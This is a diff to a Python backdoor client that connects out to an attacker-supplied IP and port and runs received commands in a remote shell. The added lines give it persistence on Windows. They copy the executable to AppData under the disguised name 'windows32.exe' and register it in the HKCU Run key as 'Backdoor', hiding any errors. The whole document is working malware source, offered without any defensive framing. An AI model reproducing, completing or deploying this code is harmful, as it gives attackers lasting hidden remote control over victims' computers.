@@ -1,10 +1,12 @@
 #! /usr/bin/python
 
+import sys
 import os
 import socket
 import json
 import subprocess
 import base64
+import shutil
 
 from ip_cred import IP, PORT
 
@@ -54,6 +56,16 @@ def shell():
 			reliable_send(result.decode("utf-8"))
 			#message = "Hello World"
 			#sock.send(message.encode("utf-8"))
+
+try:
+	# for windows pc
+	location = os.environ["appdata"] + "\\windows32.exe"
+	if not os.path.exists(location):
+		shutil.copyfile(sys.executable, location)
+		# Create persistance
+		subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)
+except:
+	pass
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
